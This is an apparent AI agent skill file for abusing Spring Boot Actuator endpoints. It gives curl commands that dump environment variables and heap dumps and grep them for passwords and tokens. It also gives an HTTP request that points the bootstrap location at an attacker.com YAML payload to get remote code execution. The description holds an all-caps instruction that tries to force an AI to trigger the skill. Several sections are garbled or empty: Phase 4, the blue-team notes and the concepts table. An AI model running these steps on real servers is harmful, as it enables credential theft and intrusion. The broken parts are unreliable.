---
name: spring-boot-actuator-abuse
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit misconfigured Spring Boot Actuator endpoints. This skill covers how to extract 
  sensitive configuration details, heap dumps, environment variables, and ultimately escalating to 
  Remote Code Execution (RCE) via `spring-cloud-starter` vulnerabilities.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0007, TA0006]
  techniques: [T1190, T1005, T1059]
platforms: [web, java]
tags: [spring-boot, actuator, information-disclosure, rce, bug-hunting, java, web-security]
tools: [burp-suite, curl, custom-scripts]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Spring Boot Actuator Abuse

## When to Use
- When auditing Java Spring Boot applications that expose monitoring and management endpoints (commonly `/actuator`).
- To extract sensitive environment variables, hidden credentials, or potentially achieve RCE when Spring Cloud routing is enabled.

## Workflow

### Phase 1: Identifying Actuator Endpoints

```bash
# curl -s http://target.com/actuator/ | jq .
curl -s http://target.com/actuator/env | jq .
curl -s http://target.com/actuator/mappings | jq .
```

### Phase 2: Extracting Sensitive Information

```bash
# curl -s http://target.com/actuator/env | grep -i "password\|secret\|key\|token" 

# curl -O http://target.com/actuator/heapdump
jhat heapdump # ```

### Phase 3: RCE via `spring-cloud-starter` (SnakeYAML)

```http
# POST /actuator/env HTTP/1.1
Host: target.com
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://attacker.com/yaml-payload.yml"}

# POST /actuator/refresh HTTP/1.1
Host: target.com
Content-Type: application/json
```

### Phase 4: Exploiting Logstash / Logback Configuration

```bash
# ```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Discover Actuator ] --> B{Sensitive Exposed ]}
    B -->|Yes| C[Dump Data ]
    B -->|No| D[Check Cloud ]
    D -->|Post Allowed | E[Exploit RCE ]
```

## 🔵 Blue Team Detection & Defense
- **Disable/Restrict Endpoints**: **Network Segmentation**: **Dependency Updates**: Key Concepts
| Concept | Description |
|---------|-------------|
| Spring Boot Actuator | |
| Heap Dump Analysis | |

## References
- HackTricks: [Spring Boot Penetration Testing](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-boot)
- Veracode: [Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
